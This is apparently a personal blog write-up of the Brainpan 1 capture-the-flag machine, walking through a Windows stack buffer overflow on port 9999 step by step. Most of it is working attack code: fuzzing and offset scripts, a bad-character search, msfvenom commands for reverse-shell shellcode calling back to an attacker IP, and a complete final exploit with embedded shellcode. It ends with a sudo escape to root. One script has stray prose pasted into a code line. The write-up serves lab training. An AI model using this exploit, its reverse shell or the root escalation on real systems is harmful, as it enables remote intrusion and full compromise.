---
layout: default
title : muzec - Brainpan 1 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/116222643-c884c780-a71c-11eb-8cd6-232495ba8a5f.png)

Ok today am not going to start with the scanning we assume everybody is ready and brainpan.exe file already loaded with immunity debugger and NOte:- the standard port for braiinpan 1 is 9999.

![image](https://user-images.githubusercontent.com/69868171/116223043-22858d00-a71d-11eb-8b34-c0ccb6bbd4ab.png)

First thing we always do is to fuzzer it with the python script below;

```

#!/usr/bin/python

# fuzzer.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.172.159"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "A"*1000

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

Now save and rin the python script if it vulnerable we should get a crash.

![image](https://user-images.githubusercontent.com/69868171/116224123-439aad80-a71e-11eb-823a-b389db2b7cc0.png)

Boom we got a crash and the `EIP` changed to `41414141` now let find the offset number with pattern_create with the byte number we got from the crash.

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1003`

![image](https://user-images.githubusercontent.com/69868171/116224917-35995c80-a71f-11eb-991f-b50d6102de8f.png)

Finding Offset Python script Below;

```

#!/usr/bin/python

# fuzzer.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.172.159"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3B"

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)ool we have the right offset number now let Note it down.



# print out what we received
print "Received: {0}".format(data)
```

![image](https://user-images.githubusercontent.com/69868171/116225272-a3458880-a71f-11eb-9311-52108cc06937.png)

Cool another crash again with a different EIP now let use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q` with the new EIP to find the right ofsset number.

![image](https://user-images.githubusercontent.com/69868171/116225670-1e0ea380-a720-11eb-806d-4b53d9517960.png)

Cool we have the right offset number now let Note it down so next thing to do is to try and overwrite the EIP to be sure we have total control over it the script below should help.

```
#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "10.10.92.122"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 524

# build a happy little message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += "BBBB"                          # SRP overwrite
buf += "CCCC"                          # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

![image](https://user-images.githubusercontent.com/69868171/116226195-b573f680-a720-11eb-9be7-a6a9139e8ca5.png)

Cool we do have total control over the EIP time to find the bad character.

Let create a working directory first;-
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00\x0a"
```

![image](https://user-images.githubusercontent.com/69868171/116226496-07b51780-a721-11eb-89b4-07208451c4f2.png)

![image](https://user-images.githubusercontent.com/69868171/116226561-1dc2d800-a721-11eb-9a58-50e88ef40d7f.png)

Generating a Bad Character with the script below;

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Running it should give us;

![image](https://user-images.githubusercontent.com/69868171/116227162-d25cf980-a721-11eb-879f-910f9af1379d.png)

Now with the below script we can find out if any bad character is present;

```
#!/usr/bin/env python2
import socket

RHOST = "10.10.92.122"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A" * 524 + "BBBB" + "C" * 10
buf += (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buf += "\n"

s.send(buf)
```

`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a < ESP-address>` with the ESP number we got from the crashed now.

![image](https://user-images.githubusercontent.com/69868171/116227859-970efa80-a722-11eb-8a1d-5c1e04e837bd.png)


![image](https://user-images.githubusercontent.com/69868171/116228026-c58cd580-a722-11eb-943a-661438a14caf.png)

A popup window should appear labelled “mona Memory comparison results”. If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte `(\x00`) since we already removed it from the file. Make a note of any others.

NOTE:- according to some research i do `"\0a"` is also a bad character.

Now time to find a Jump Point with `!mona jmp -r esp -cpb "\x00\0a"` if you get an error use `!mona jmp -r esp -cpb "\x00"` and you should be good to go.

![image](https://user-images.githubusercontent.com/69868171/116228905-e144ab80-a723-11eb-9569-2f8392b9fb56.png)

Cool we found 1 pointer the command i just use now  finds all `“jmp esp”` (or equivalent) instructions with addresses that don’t contain any of the badchars specified.

Now let pick the pointer `311712f3` now what we have to do is to write it backward (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

Now time to generate our payload to get a reverse shell back to our terminal.

`msfvenom -p windows/shell_reverse_tcp LHOST=IP-Adress LPORT=4444 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a"`

![image](https://user-images.githubusercontent.com/69868171/116229771-e6562a80-a724-11eb-91a1-32fa002d0a35.png)

PREPEND NOPS:-

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more “No Operation” (\x90) bytes:

OUR FINAL EXPLOIT!

```
#!/usr/bin/env python

# usage python exploit.py <targetIP> <targetPort>

import sys, socket

rhost = sys.argv[1]
rport = int(sys.argv[2])

# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.156 LPORT=4444 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a"

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.0.156 LPORT=4444 -f c -a x86 --platform linux -e x86/shikata_ga_nai -b "\x00\x0a"

shellcode = ("\xbb\xbd\x96\x9f\x10\xd9\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x83\xc5\x04\x31\x5d\x0e\x03\xe0\x98\x7d\xe5\xe6\x4d\x03"
"\x06\x16\x8e\x64\x8e\xf3\xbf\xa4\xf4\x70\xef\x14\x7e\xd4\x1c"
"\xde\xd2\xcc\x97\x92\xfa\xe3\x10\x18\xdd\xca\xa1\x31\x1d\x4d"
"\x22\x48\x72\xad\x1b\x83\x87\xac\x5c\xfe\x6a\xfc\x35\x74\xd8"
"\x10\x31\xc0\xe1\x9b\x09\xc4\x61\x78\xd9\xe7\x40\x2f\x51\xbe"
"\x42\xce\xb6\xca\xca\xc8\xdb\xf7\x85\x63\x2f\x83\x17\xa5\x61"
"\x6c\xbb\x88\x4d\x9f\xc5\xcd\x6a\x40\xb0\x27\x89\xfd\xc3\xfc"
"\xf3\xd9\x46\xe6\x54\xa9\xf1\xc2\x65\x7e\x67\x81\x6a\xcb\xe3"
"\xcd\x6e\xca\x20\x66\x8a\x47\xc7\xa8\x1a\x13\xec\x6c\x46\xc7"
"\x8d\x35\x22\xa6\xb2\x25\x8d\x17\x17\x2e\x20\x43\x2a\x6d\x2d"
"\xa0\x07\x8d\xad\xae\x10\xfe\x9f\x71\x8b\x68\xac\xfa\x15\x6f"
"\xd3\xd0\xe2\xff\x2a\xdb\x12\xd6\xe8\x8f\x42\x40\xd8\xaf\x08"
"\x90\xe5\x65\x9e\xc0\x49\xd6\x5f\xb0\x29\x86\x37\xda\xa5\xf9"
"\x28\xe5\x6f\x92\xc3\x1c\xf8\x97\x1b\x1e\x64\xcf\x19\x1e\x85"
"\x4c\x97\xf8\xcf\x7c\xf1\x53\x78\xe4\x58\x2f\x19\xe9\x76\x4a"
"\x19\x61\x75\xab\xd4\x82\xf0\xbf\x81\x62\x4f\x9d\x04\x7c\x65"
"\x89\xcb\xef\xe2\x49\x85\x13\xbd\x1e\xc2\xe2\xb4\xca\xfe\x5d"
"\x6f\xe8\x02\x3b\x48\xa8\xd8\xf8\x57\x31\xac\x45\x7c\x21\x68"
"\x45\x38\x15\x24\x10\x96\xc3\x82\xca\x58\xbd\x5c\xa0\x32\x29"
"\x18\x8a\x84\x2f\x25\xc7\x72\xcf\x94\xbe\xc2\xf0\x19\x57\xc3"
"\x89\x47\xc7\x2c\x40\xcc\xf7\x66\xc8\x65\x90\x2e\x99\x37\xfd"
"\xd0\x74\x7b\xf8\x52\x7c\x04\xff\x4b\xf5\x01\xbb\xcb\xe6\x7b"
"\xd4\xb9\x08\x2f\xd5\xeb")

payload = "\x90" * 524 + "\xf3\x12\x17\x31" + "\x90" * 32 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(payload + '\r\n')
data = s.recv(1024)
s.close()
```

Now let start our ncat listener and run the final exploit if we have everything right we should get a shell back.

![image](https://user-images.githubusercontent.com/69868171/116232299-f15e8a00-a727-11eb-8721-574c4de57b40.png)

Boom now since we have shell time to point it to the machine and between it a linux machine so we need to generate another payload.

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN-IP LPORT=4444 -f c -a x86 --platform linux -e x86/shikata_ga_nai -b "\x00\x0a"`

![image](https://user-images.githubusercontent.com/69868171/116232689-76e23a00-a728-11eb-9d76-8fa3b8c5d139.png)

And boom we have shell.

![image](https://user-images.githubusercontent.com/69868171/116239640-e52afa80-a730-11eb-887a-8792b0cc792a.png)

Now let get root.

![image](https://user-images.githubusercontent.com/69868171/116239914-363aee80-a731-11eb-8c1b-c3b06c2934cc.png)

`sudo -u root /home/anansi/bin/anansi_util manual /bin/bash`

`!sh`

And boom we are root.

![image](https://user-images.githubusercontent.com/69868171/116240591-ff190d00-a731-11eb-8301-826230323a67.png)


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


